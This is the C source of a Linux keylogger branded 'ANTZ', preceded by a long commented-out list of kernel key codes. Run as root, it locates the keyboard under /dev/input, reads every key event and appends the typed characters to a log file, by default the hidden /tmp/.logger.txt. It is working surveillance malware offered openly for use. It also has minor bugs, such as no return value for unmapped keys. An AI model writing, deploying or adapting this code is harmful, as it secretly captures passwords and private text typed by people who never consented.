/*ANTZ SIMPLE_LOCAL_KEYLOGGER*/
/*A lot of functionalities must be added. Coming soon......*/


/*
#define KEY_RESERVED		0
#define KEY_ESC			1
#define KEY_1			2
#define KEY_2			3
#define KEY_3			4
#define KEY_4			5
#define KEY_5			6
#define KEY_6			7
#define KEY_7			8
#define KEY_8			9
#define KEY_9			10
#define KEY_0			11
#define KEY_MINUS		12
#define KEY_EQUAL		13
#define KEY_BACKSPACE		14
#define KEY_TAB			15
#define KEY_Q			16
#define KEY_W			17
#define KEY_E			18
#define KEY_R			19
#define KEY_T			20
#define KEY_Y			21
#define KEY_U			22
#define KEY_I			23
#define KEY_O			24
#define KEY_P			25
#define KEY_LEFTBRACE		26
#define KEY_RIGHTBRACE		27
#define KEY_ENTER		28
#define KEY_LEFTCTRL		29
#define KEY_A			30
#define KEY_S			31
#define KEY_D			32
#define KEY_F			33
#define KEY_G			34
#define KEY_H			35
#define KEY_J			36
#define KEY_K			37
#define KEY_L			38
#define KEY_SEMICOLON		39
#define KEY_APOSTROPHE		40
#define KEY_GRAVE		41
#define KEY_LEFTSHIFT		42
#define KEY_BACKSLASH		43
#define KEY_Z			44
#define KEY_X			45
#define KEY_C			46
#define KEY_V			47
#define KEY_B			48
#define KEY_N			49
#define KEY_M			50
#define KEY_COMMA		51
#define KEY_DOT			52
#define KEY_SLASH		53
#define KEY_RIGHTSHIFT		54
#define KEY_KPASTERISK		55
#define KEY_LEFTALT		56
#define KEY_SPACE		57
#define KEY_CAPSLOCK		58
#define KEY_F1			59
#define KEY_F2			60
#define KEY_F3			61
#define KEY_F4			62
#define KEY_F5			63
#define KEY_F6			64
#define KEY_F7			65
#define KEY_F8			66
#define KEY_F9			67
#define KEY_F10			68
#define KEY_NUMLOCK		69
#define KEY_SCROLLLOCK		70
#define KEY_KP7			71
#define KEY_KP8			72
#define KEY_KP9			73
#define KEY_KPMINUS		74
#define KEY_KP4			75
#define KEY_KP5			76
#define KEY_KP6			77
#define KEY_KPPLUS		78
#define KEY_KP1			79
#define KEY_KP2			80
#define KEY_KP3			81
#define KEY_KP0			82
#define KEY_KPDOT		83

#define KEY_ZENKAKUHANKAKU	85
#define KEY_102ND		86
#define KEY_F11			87
#define KEY_F12			88
#define KEY_RO			89
#define KEY_KATAKANA		90
#define KEY_HIRAGANA		91
#define KEY_HENKAN		92
#define KEY_KATAKANAHIRAGANA	93
#define KEY_MUHENKAN		94
#define KEY_KPJPCOMMA		95
#define KEY_KPENTER		96
#define KEY_RIGHTCTRL		97
#define KEY_KPSLASH		98
#define KEY_SYSRQ		99
#define KEY_RIGHTALT		100
#define KEY_LINEFEED		101
#define KEY_HOME		102
#define KEY_UP			103
#define KEY_PAGEUP		104
#define KEY_LEFT		105
#define KEY_RIGHT		106
#define KEY_END			107
#define KEY_DOWN		108
#define KEY_PAGEDOWN		109
#define KEY_INSERT		110
#define KEY_DELETE		111
#define KEY_MACRO		112
#define KEY_MUTE		113
#define KEY_VOLUMEDOWN		114
#define KEY_VOLUMEUP		115
#define KEY_POWER		116	// SC System Power Down 
#define KEY_KPEQUAL		117
#define KEY_KPPLUSMINUS		118
#define KEY_PAUSE		119
#define KEY_SCALE		120	// AL Compiz Scale (Expose) 

#define KEY_KPCOMMA		121
#define KEY_HANGEUL		122
#define KEY_HANGUEL		KEY_HANGEUL
#define KEY_HANJA		123
#define KEY_YEN			124
#define KEY_LEFTMETA		125
#define KEY_RIGHTMETA		126
#define KEY_COMPOSE		127

#define KEY_STOP		128	// AC Stop 
#define KEY_AGAIN		129
#define KEY_PROPS		130	// AC Properties 
#define KEY_UNDO		131	// AC Undo 
#define KEY_FRONT		132
#define KEY_COPY		133	// AC Copy 
#define KEY_OPEN		134	// AC Open 
#define KEY_PASTE		135	// AC Paste 
#define KEY_FIND		136	// AC Search 
#define KEY_CUT			137	// AC Cut 
#define KEY_HELP		138	// AL Integrated Help Center 
#define KEY_MENU		139	// Menu (show menu) 
#define KEY_CALC		140	// AL Calculator 
#define KEY_SETUP		141
#define KEY_SLEEP		142	// SC System Sleep 
#define KEY_WAKEUP		143	// System Wake Up 
#define KEY_FILE		144	// AL Local Machine Browser 
#define KEY_SENDFILE		145
#define KEY_DELETEFILE		146
#define KEY_XFER		147
#define KEY_PROG1		148
#define KEY_PROG2		149
#define KEY_WWW			150	// AL Internet Browser 
#define KEY_MSDOS		151
#define KEY_COFFEE		152	// AL Terminal Lock/Screensaver 
#define KEY_SCREENLOCK		KEY_COFFEE
#define KEY_ROTATE_DISPLAY	153	// Display orientation for e.g. tablets 
#define KEY_DIRECTION		KEY_ROTATE_DISPLAY
#define KEY_CYCLEWINDOWS	154
#define KEY_MAIL		155
#define KEY_BOOKMARKS		156	// AC Bookmarks 
#define KEY_COMPUTER		157
#define KEY_BACK		158	// AC Back 
#define KEY_FORWARD		159	// AC Forward 
#define KEY_CLOSECD		160
#define KEY_EJECTCD		161
#define KEY_EJECTCLOSECD	162
#define KEY_NEXTSONG		163
#define KEY_PLAYPAUSE		164
#define KEY_PREVIOUSSONG	165
#define KEY_STOPCD		166
#define KEY_RECORD		167
#define KEY_REWIND		168
#define KEY_PHONE		169	// Media Select Telephone 
#define KEY_ISO			170
#define KEY_CONFIG		171	// AL Consumer Control Configuration 
#define KEY_HOMEPAGE		172	// AC Home 
#define KEY_REFRESH		173	// AC Refresh 
#define KEY_EXIT		174	// AC Exit 
#define KEY_MOVE		175
#define KEY_EDIT		176
#define KEY_SCROLLUP		177
#define KEY_SCROLLDOWN		178
#define KEY_KPLEFTPAREN		179
#define KEY_KPRIGHTPAREN	180
#define KEY_NEW			181	// AC New 
#define KEY_REDO		182	// AC Redo/Repeat 

#define KEY_F13			183
#define KEY_F14			184
#define KEY_F15			185
#define KEY_F16			186
#define KEY_F17			187
#define KEY_F18			188
#define KEY_F19			189
#define KEY_F20			190
#define KEY_F21			191
#define KEY_F22			192
#define KEY_F23			193
#define KEY_F24			194

#define KEY_PLAYCD		200
#define KEY_PAUSECD		201
#define KEY_PROG3		202
#define KEY_PROG4		203
#define KEY_DASHBOARD		204	// AL Dashboard 
#define KEY_SUSPEND		205
#define KEY_CLOSE		206	// AC Close 
#define KEY_PLAY		207
#define KEY_FASTFORWARD		208
#define KEY_BASSBOOST		209
#define KEY_PRINT		210	// AC Print 
#define KEY_HP			211
#define KEY_CAMERA		212
#define KEY_SOUND		213
#define KEY_QUESTION		214
#define KEY_EMAIL		215
#define KEY_CHAT		216
#define KEY_SEARCH		217
#define KEY_CONNECT		218
#define KEY_FINANCE		219	// AL Checkbook/Finance 
#define KEY_SPORT		220
#define KEY_SHOP		221
#define KEY_ALTERASE		222
#define KEY_CANCEL		223	// AC Cancel 
#define KEY_BRIGHTNESSDOWN	224
#define KEY_BRIGHTNESSUP	225
#define KEY_MEDIA		226

#define KEY_SWITCHVIDEOMODE	227	// Cycle between available video
					   outputs (Monitor/LCD/TV-out/etc) 
#define KEY_KBDILLUMTOGGLE	228
#define KEY_KBDILLUMDOWN	229
#define KEY_KBDILLUMUP		230

#define KEY_SEND		231	// AC Send 
#define KEY_REPLY		232	// AC Reply 
#define KEY_FORWARDMAIL		233	// AC Forward Msg 
#define KEY_SAVE		234	// AC Save 
#define KEY_DOCUMENTS		235

#define KEY_BATTERY		236

#define KEY_BLUETOOTH		237
#define KEY_WLAN		238
#define KEY_UWB			239

#define KEY_UNKNOWN		240

#define KEY_VIDEO_NEXT		241	// drive next video source 
#define KEY_VIDEO_PREV		242	// drive previous video source 
#define KEY_BRIGHTNESS_CYCLE	243	// brightness up, after max is min 
#define KEY_BRIGHTNESS_AUTO	244	// Set Auto Brightness: manual
					  brightness control is off,
					  rely on ambient 
#define KEY_BRIGHTNESS_ZERO	KEY_BRIGHTNESS_AUTO
#define KEY_DISPLAY_OFF		245	// display device to off state 

#define KEY_WWAN		246	// Wireless WAN (LTE, UMTS, GSM, etc.) 
#define KEY_WIMAX		KEY_WWAN
#define KEY_RFKILL		247	// Key that controls all radios 

#define KEY_MICMUTE		248	// Mute / unmute the microphone 
*/

/*
 * The event structure itself


struct input_event {
	struct timeval time;
	__u16 type;
	__u16 code;
	__s32 value;
};

*/


#include <linux/input.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <unistd.h>

char* code_to_char(int code)
{
	switch(code)
	{
		//Letters:
		case KEY_A: return "a"; break;			
		case KEY_B: return "b"; break;
		case KEY_C: return "c"; break;
		case KEY_D: return "d"; break;
		case KEY_E: return "e"; break;
		case KEY_F: return "f"; break;
		case KEY_G: return "g"; break;
		case KEY_H: return "h"; break;
		case KEY_I: return "i"; break;
		case KEY_J: return "j"; break;
		case KEY_K: return "k"; break;
		case KEY_L: return "l"; break;
		case KEY_M: return "m"; break;
		case KEY_N: return "n"; break;
		case KEY_O: return "o"; break;
		case KEY_P: return "p"; break;
		case KEY_Q: return "q"; break;
		case KEY_R: return "r"; break;
		case KEY_S: return "s"; break;
		case KEY_T: return "t"; break;
		case KEY_U: return "u"; break;
		case KEY_V: return "v"; break;
		case KEY_W: return "w"; break;
		case KEY_X: return "x"; break;
		case KEY_Y: return "y"; break;
		case KEY_Z: return "z"; break;
		//Numbers:
		case KEY_0: return "0"; break;
		case KEY_1: return "1"; break;
		case KEY_2: return "2"; break;
		case KEY_3: return "3"; break;
		case KEY_4: return "4"; break;
		case KEY_5: return "5"; break;
		case KEY_6: return "6"; break;
		case KEY_7: return "7"; break;
		case KEY_8: return "8"; break;
		case KEY_9: return "9"; break;
		//Special chars:
		case KEY_ESC: return "<ESC>"; break;
		case KEY_BACKSPACE: return "<BACKSPACE>"; break;
 		case KEY_TAB: return "<TAB>"; break;
		case KEY_MINUS: return "-"; break;
		case KEY_EQUAL: return "="; break;
		case KEY_LEFTBRACE: return "("; break;
		case KEY_RIGHTBRACE: return ")"; break;
		case KEY_ENTER: return "<ENTER>"; break;
		case KEY_LEFTCTRL: return "<LEFTCTRL>"; break;
		case KEY_SEMICOLON: return ";"; break;
		case KEY_APOSTROPHE: return "'"; break;
		case KEY_GRAVE: return "`"; break;
		case KEY_LEFTSHIFT: return "<LEFTSHIFT>"; break;
		case KEY_BACKSLASH: return "\\"; break;
		case KEY_COMMA: return ","; break;
		case KEY_DOT: return "."; break;
		case KEY_SLASH: return "/"; break;
		case KEY_RIGHTSHIFT: return "<RIGHTSHIFT>"; break;
		case KEY_KPASTERISK: return "<Keypad *>"; break;
		case KEY_LEFTALT: return "<LEFTALT>"; break;
		case KEY_SPACE: return "<SPACE>"; break;
		case KEY_CAPSLOCK: return "<CAPSLOCK>"; break;
		case KEY_F1: return "<F1>"; break;
		case KEY_F2: return "<F2>"; break;
		case KEY_F3: return "<F3>"; break;
		case KEY_F4: return "<F4>"; break;
		case KEY_F5: return "<F5>"; break;
		case KEY_F6: return "<F6>"; break;
		case KEY_F7: return "<F7>"; break;
		case KEY_F8: return "<F8>"; break;
		case KEY_F9: return "<F9>"; break;
		case KEY_F10: return "<F10>"; break;
		case KEY_F11: return "<F11>"; break;
		case KEY_F12: return "<F12>"; break;
		case KEY_F13: return "<F13>"; break;
		case KEY_F14: return "<F14>"; break;
		case KEY_F15: return "<F15>"; break;
		case KEY_F16: return "<F16>"; break;
		case KEY_F17: return "<F17>"; break;
		case KEY_F18: return "<F18>"; break;
		case KEY_F19: return "<F19>"; break;
		case KEY_F20: return "<F20>"; break;
		case KEY_F21: return "<F21>"; break;
		case KEY_F22: return "<F22>"; break;
		case KEY_F23: return "<F23>"; break;
		case KEY_F24: return "<F24>"; break;
		case KEY_NUMLOCK: return "<NUMLOCK>"; break;
		case KEY_KP0: return "<Keypad 0>"; break;
		case KEY_KP1: return "<Keypad 1>"; break;
		case KEY_KP2: return "<Keypad 2>"; break;
		case KEY_KP3: return "<Keypad 3>"; break;
		case KEY_KP4: return "<Keypad 4>"; break;
		case KEY_KP5: return "<Keypad 5>"; break;
		case KEY_KP6: return "<Keypad 6>"; break;
		case KEY_KP7: return "<Keypad 7>"; break;
		case KEY_KP8: return "<Keypad 8>"; break;
		case KEY_KP9: return "<Keypad 9>"; break;
		case KEY_KPPLUS: return "<Keypad +>"; break;
		case KEY_KPMINUS: return "<Keypad ->"; break;
		case KEY_KPDOT: return "<Keypad .>"; break;
		case KEY_KPENTER: return "<Keypad EnTER>"; break;
		case KEY_RIGHTCTRL: return "<RIGHTCTRL>"; break;
		case KEY_KPSLASH: return "<Keypad />"; break;
		case KEY_RIGHTALT: return "<RIGHTALT>"; break;
		case KEY_UP: return "<UP>"; break;
		case KEY_PAGEUP: return "<PAGEUP>"; break;
		case KEY_LEFT: return "<LEFT>"; break;
		case KEY_RIGHT: return "<RIGHT>"; break;
		case KEY_END: return "<END>"; break;
		case KEY_DOWN: return "<DOWN>"; break;
		case KEY_PAGEDOWN: return "<PAGEDOWN>"; break;
		case KEY_INSERT: return "<INSERT>"; break;
		case KEY_DELETE: return "<DELETE>"; break;
		case KEY_MUTE: return "<MUTE>"; break;
		case KEY_VOLUMEDOWN: return "<VOLUMEDOWN>"; break;
		case KEY_VOLUMEUP: return "<VOLUMEUP>"; break;
		case KEY_POWER: return "<POWER>"; break;
	}
}

void handler()
{
	printf("\nExit..\n");
	exit(0);
}

//It must be run as root
// sudo ./Simple_Local_Keylogger [-d device] [ -o /path/to/file.txt]

void banner()
{
	
fprintf(stderr,"_____/\\\\\\\\\\\\\\\\\\\\\\\____/\\\\\\______________/\\\\\\________/\\\\\\_\n");        
fprintf(stderr," ___/\\\\\\/////////\\\\\\_\\/\\\\\\_____________\\/\\\\\\_____/\\\\\\//__\n");       
fprintf(stderr,"  __\\//\\\\\\______\\///__\\/\\\\\\_____________\\/\\\\\\__/\\\\\\//_____\n");      
fprintf(stderr,"   ___\\////\\\\\\_________\\/\\\\\\_____________\\/\\\\\\\\\\\\//\\\\\\_____\n");     
fprintf(stderr,"    ______\\////\\\\\\______\\/\\\\\\_____________\\/\\\\\\//_\\//\\\\\\____\n");    
fprintf(stderr,"     _________\\////\\\\\\___\\/\\\\\\_____________\\/\\\\\\____\\//\\\\\\___\n");   
fprintf(stderr,"      __/\\\\\\______\\//\\\\\\__\\/\\\\\\_____________\\/\\\\\\_____\\//\\\\\\__\n");  
fprintf(stderr,"       _\\///\\\\\\\\\\\\\\\\\\\\\\/___\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\______\\//\\\\\\_\n"); 
fprintf(stderr,"        ___\\///////////_____\\///////////////__\\///________\\///__\n");
fprintf(stderr,"\n~antz~\n");

}


#define LEN 64

int main(int argc, char** argv)
{	
	struct input_event event;
	struct dirent *curr;
	char name[LEN], filetxt[LEN]; 
	int c, d = 0, o = 0, dev, readed, size = sizeof(struct input_event), check = 1;	
	DIR *directory;
	FILE *dst;	

	void usage()
	{
		banner();
		fprintf(stderr,"\nUsage: #%s [-d device] [-o output.txt]\n", argv[0]);
		exit(0);
	}
	
	while((c = getopt(argc, argv, ":d:o:")) != -1)
	{
		switch(c)
		{
			case 'd': 
					strncpy(name, optarg, LEN); 
					name[LEN-1] = '\0';
					d = 1;
					break;
			case 'o': 	strncpy(filetxt, optarg, LEN); 
					filetxt[LEN-1] = '\0';
					o = 1;
					break;
			default:
					usage();
		}
	}

	

	if(signal(SIGINT, handler) == SIG_ERR)
	{
		fprintf(stderr, "Error to handle SIGINT\n");
		exit(1);
	}
	if(!o)
	{
		snprintf(filetxt, 17, "/tmp/.logger.txt");
	}
	if( (dst = fopen(filetxt, "a")) == NULL)
	{
		fprintf(stderr,"Error to open file\n");
		exit(1);
	}
	
	if(!d)
	{
		if((directory = opendir("/dev/input/by-path")) == NULL)
		{	
			fprintf(stderr, "Failed to open dir \"/dev/input/by-path\"\n");
			exit(1);
		}
		while((curr = readdir(directory)) != NULL)
		{
			if(strstr(curr->d_name, "kbd"))
			{
				snprintf(name, LEN, "/dev/input/by-path/%s", curr->d_name);
				check = 0;
				break;
			}
		}
		if(check)
		{
			fprintf(stderr, "Failed to find device..\n");
			exit(1);
		}
	}

	if((dev = open(name, O_RDONLY)) == -1)
	{
		fprintf(stderr,"Failed to open %s\n", argv[1]);
		exit(1);
	}
	
	while(1)
	{

		memset(&event, 0x0, size); 
		if((readed = read(dev, &event, size))< size)
		{
			fprintf(stderr, "Failed to read\n");
			exit(1);
		}
		
		if(event.type == EV_KEY && !event.value)
			
			fprintf(dst,"%s",code_to_char(event.code));
			fflush(NULL);
			
	}
	return 0;
}
